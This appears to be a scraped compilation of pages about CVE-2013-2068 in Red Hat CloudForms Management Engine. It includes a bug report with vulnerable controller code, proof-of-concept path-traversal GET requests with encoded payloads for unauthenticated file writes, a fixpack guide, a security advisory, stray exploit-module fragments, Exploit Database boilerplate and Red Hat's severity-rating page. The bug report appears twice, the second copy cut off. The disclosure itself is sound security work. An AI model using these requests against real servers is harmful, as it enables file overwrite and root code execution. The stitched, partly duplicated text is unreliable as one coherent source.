| [Description](show_bug.cgi?id=960422#c0)  Kurt Seifried    2013-05-07 07:58:04 UTC  ```  Ramon de C Valle (rcvalle) reports:  Multiple path traversal exist within the   1) log method of AgentController controller of CFME. The log method can be  accessed directly at <http://host/agent/log>.  The log method deletes (if the file exists) and creates a file using the user-controlled filename parameter without sanitizing it. The contents of the file are subsequently written as the user-controlled data parameter as ZIP encoded data.  In vmdb/app/controllers/agent_controller.rb:56:      data = MIQEncode.decode(params["data"])     file = File.join(proxy.logdir, params["filename"])     options = params["options"]     $log.info "MIQ(agent-log): [#{options.inspect}]" unless params["options"].nil?      File.delete(file) if File.exists?(file)     $log.info "MIQ(agent-log): Create file: #{file}"     File.open(file, "wb") {|f| f.write(data)}  This vulnerability can be exploited by sending a specially crafted request containing a valid host guid that has at least one associated proxy. For instance, the following GET request creates the file pwned.txt containing the word 'pwned' at the /var/www/miq/vmdb/public/ directory.  <https://host/agent/log?&id=8dfc29fe-a118-11e2-805c-005056920a2c&filename=../../../../../../../../../var/www/miq/vmdb/public/pwned.txt&data=eJwrKM9LTQEABokCHw>==  Where id is a valid host guid that has at least one associated proxy, and data is encoded as follows:  [rcvalle@ThinkPad ~]$ irb irb(main):001:0> require 'zlib' => true irb(main):002:0> [Zlib::Deflate.deflate('pwned')].pack('m') => "eJwrKM9LTQEABokCHw==\n" irb(main):003:0>  Additionaly, the file modification time can also be specified with the user-supplied mtime parameter which is set by the log method after the file is created. This could be used for hiding the file from searches for newly created files.  2) upload method of AgentController controller of CFME. The upload  method can be accessed directly at <http://host/agent/upload>.  The upload method deletes (if the file exists) and creates a file using the user-controlled filename parameter without sanitizing it. The contents of the file are subsequently written as the user-controlled data parameter as ZIP encoded data.  In vmdb/app/controllers/agent_controller.rb:102:      file = File.join(mediadir, params["filename"])     md5 = Digest::MD5.hexdigest(data).to_s     raise "upoload of file #{file} failed, md5 mismatch, expected #{params["md5"]}, got #{md5}" if params["md5"] != md5      $log.info "MIQ(agent-upload): Saving agent file: #{file}"     File.delete(file) if File.exists?(file)     $log.info "MIQ(agent-upload): Create file: #{file}"     File.open(file, "wb") {|f| f.write(data); f.close}  This vulnerability can be exploited by sending a specially crafted request containing a valid platform in the first 4 bytes of the data parameter, the MD5 checksum of the data parameter, and any numeric value as the agent version. For instance, the following GET request creates the file pwned.txt containing the word 'pwned' at the /var/www/miq/vmdb/public/ directory.  <https://host/agent/upload?&filename=../../../../../../../../../var/www/miq/vmdb/public/pwned.txt&data=eJyrd/VxKyjPS00BABDkA3U=&md5=b131830a18266f83111d9149adb6451d&version=1>  Where data is encoded as follows:  [rcvalle@ThinkPad ~]$ irb irb(main):001:0> require 'zlib' => true irb(main):002:0> [Zlib::Deflate.deflate("\x7f\x45\x4c\x46pwned")].pack('m') => "eJyrd/VxKyjPS00BABDkA3U=\n"  And md5 as follows:  irb(main):003:0> require 'digest/md5' => true irb(main):004:0> Digest::MD5.hexdigest("\x7f\x45\x4c\x46pwned") => "b131830a18266f83111d9149adb6451d"  3) linuxpkgs method of AgentController controller of CFME. The log method can  be accessed directly at <http://host/agent/linuxpkgs>.  The linuxpkgs method deletes (if the file exists) and creates a file using the user-controlled filename parameter without sanitizing it. The contents of the file are subsequently written as the user-controlled data parameter as ZIP encoded data.  In vmdb/app/controllers/agent_controller.rb:119:      filename = params["filename"]     datadir = File.join(File.expand_path(Rails.root), "data", "applications")     Dir.mkdir datadir unless File.exists?(datadir)      file = File.join(datadir, filename)     data = MIQEncode.decode(params["data"])     md5 = Digest::MD5.hexdigest(data).to_s      raise "upoload of file #{file} failed, md5 mismatch, expected #{params["md5"]}, got #{md5}" if params["md5"] != md5      File.delete(file) if File.exists?(file)     $log.info "MIQ(agent-upload): Create file: #{file}"     File.open(file, "wb") {|f| f.write(data); f.close}  This vulnerability can be exploited by sending a specially crafted request containing the MD5 checksum of the data parameter. For instance, the following GET request creates the file pwned.txt containing the word 'pwned' at the /var/www/miq/vmdb/public/ directory.  <https://host/agent/linuxpkgs?&filename=../../../../../../../../../var/www/miq/vmdb/public/pwned.txt&data=eJwrKM9LTQEABokCHw==&md5=5e93de3efa544e85dcd6311732d28f95>  Where data is encoded as follows:  [rcvalle@ThinkPad ~]$ irb irb(main):001:0> require 'zlib' => true irb(main):002:0> [Zlib::Deflate.deflate('pwned')].pack('m') => "eJwrKM9LTQEABokCHw==\n"  And md5 as follows:  irb(main):003:0> require 'digest/md5' => true irb(main):004:0> Digest::MD5.hexdigest('pwned') => "5e93de3efa544e85dcd6311732d28f95"   ```  [Comment 2](show_bug.cgi?id=960422#c2)  Kurt Seifried    2013-05-07 18:18:04 UTC  ``` Please note that the zip file is unpacked after uploading meaning that arbitrary file creation and overwrite of file writable by the server server process is possible. Additionally code execution is possible.   ```  [Comment 3](show_bug.cgi?id=960422#c3)  Ramon de C Valle    2013-05-07 18:56:40 UTC  ``` Note that authentication also is not required for these resources.   ```  [Comment 14](show_bug.cgi?id=960422#c14)  errata-xmlrpc    2013-09-04 18:10:26 UTC  ``` This issue has been addressed in following products:    Red Hat CloudForms Management Engine 2.0  Via RHSA-2013:1206 <https://rhn.redhat.com/errata/RHSA-2013-1206.html>   ```  [Comment 16](show_bug.cgi?id=960422#c16)  Vincent Danen    2013-09-26 19:06:19 UTC  ``` Acknowledgements:  This issue was discovered by Ramon de C Valle of the Red Hat Product Security Team.   ``` |  |

# Uploading and Applying CloudForms Management Engine Updates version 5.1 and below

Updated 2015-02-08T02:46:29+00:00 -
English

* No translations currently exist.

This bulletin contains the following information for Red Hat CloudForms Management Engine (CFME) version 5.0 and 5.1.

* How to upload a CFME Server update.
* How to activate the update.

Place the fix pack file in a location that you can access from the computer where you are running the CFME Console. CFME Server updates must be activated for each server, allowing you to try a fix on one CFME Server before activating it on all of them. The Maintenance page in the CFME Console allows you to easily upload and remove updates to the CFME Server. Once uploaded, CFME automatically detects what files are being added and where they should reside.

### To upload an update

1. Click the wrench icon **Settings & Operations**.
2. From **Configuration, Settings**, click **Zones**.
3. Click the Zone where the CFME Server is located.
4. Click on the CFME Server.
5. Click **Maintenance**.
6. Click **Browse** to go to the location where the Product Update file is located.
7. Click **Upload**.

The update is loaded and processing begins. During processing, the files are loaded into their appropriate locations. It will take a few minutes for the updates to show in the **Available CFME Product Updates** area. *You may need to refresh the browser window to see the update.*

### To activate CFME Server updates

1. Click the wrench icon **Settings & Operations**.
2. From **Configuration, Settings**, click **Zones**.
3. Click the Zone where the CFME Server is located.
4. Click on the CFME Server that you want to apply the maintenance to.
5. Click **Maintenance**.
6. Click on the row with **Component** of **vmdb**. The properties of the update will display.
7. Click **Activate**.

The update is applied and the CFME Server is restarted. Validate that the CFME Server restarts.

RHSA-2013:1206 - Security Advisory

Issued:
2013-09-04
Updated:
2013-09-04
# RHSA-2013:1206 - Security Advisory

* [Overview](#overview)

## Synopsis

Critical: Red Hat CloudForms Management Engine security update

## Type/Severity

Security Advisory: Critical

## Topic

The RHSA-2013:1157 update for Red Hat CloudForms Management Engine included
an additional fix that was not documented in the erratum.

The Red Hat Security Response Team has rated this update as having
critical security impact. A Common Vulnerability Scoring System (CVSS)
base score, which gives a detailed severity rating, is available from the
CVE link in the References section.

## Description

Red Hat CloudForms Management Engine provides the insight, control, and
automation needed to address the challenges of managing virtual
environments.

Multiple directory traversal flaws were found in Red Hat CloudForms
Management Engine. A remote, unauthenticated attacker could use these flaws
to upload arbitrary code, and have that code executed with root privileges
on Red Hat CloudForms Management Engine. (CVE-2013-2068)

This issue was discovered by Ramon de C Valle of the Red Hat Product
Security Team.

Note: This issue was already addressed in the fixpack released as part of
RHSA-2013:1157, however it was not documented and therefore the erratum was
incorrectly rated as having important security impact. No new packages are
available in this erratum; please install the fixpack as noted in
RHSA-2013:1157.

Refer to the Solution section of this erratum for installation
instructions.

## Solution

The update is provided in a fixpack, available from:

<https://rhn.redhat.com/rhn/software/channel/downloads/Download.do?cid=17971>

        It uploads a fake controller to the controllers directory of the Rails

        this action to execute the payload. Optionally, it can also upload a routing

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

| [Description](show_bug.cgi?id=960422#c0)  Kurt Seifried    2013-05-07 07:58:04 UTC  ```  Ramon de C Valle (rcvalle) reports:  Multiple path traversal exist within the   1) log method of AgentController controller of CFME. The log method can be  accessed directly at <http://host/agent/log>.  The log method deletes (if the file exists) and creates a file using the user-controlled filename parameter without sanitizing it. The contents of the file are subsequently written as the user-controlled data parameter as ZIP encoded data.  In vmdb/app/controllers/agent_controller.rb:56:      data = MIQEncode.decode(params["data"])     file = File.join(proxy.logdir, params["filename"])     options = params["options"]     $log.info "MIQ(agent-log): [#{options.inspect}]" unless params["options"].nil?      File.delete(file) if File.exists?(file)     $log.info "MIQ(agent-log): Create file: #{file}"     File.open(file, "wb") {|f| f.write(data)}  This vulnerability can be exploited by sending a specially crafted request containing a valid host guid that has at least one associated proxy. For instance, the following GET request creates the file pwned.txt containing the word 'pwned' at the /var/www/miq/vmdb/public/ directory.  <https://host/agent/log?&id=8dfc29fe-a118-11e2-805c-005056920a2c&filename=../../../../../../../../../var/www/miq/vmdb/public/pwned.txt&data=eJwrKM9LTQEABokCHw>==  Where id is a valid host guid that has at least one associated proxy, and data is encoded as follows:  [rcvalle@ThinkPad ~]$ irb irb(main):001:0> require 'zlib' => true irb(main):002:0> [Zlib::Deflate.deflate('pwned')].pack('m') => "eJwrKM9LTQEABokCHw==\n" irb(main):003:0>  Additionaly, the file modification time can also be specified with the user-supplied mtime parameter which is set by the log method after the file is created. This could be used for hiding the file from searches for newly created files.  2) upload method of AgentController controller of CFME. The upload  method can be accessed directly at <http://host/agent/upload>.  The upload method deletes (if the file exists) and creates a file using the user-controlled filename parameter without sanitizing it.
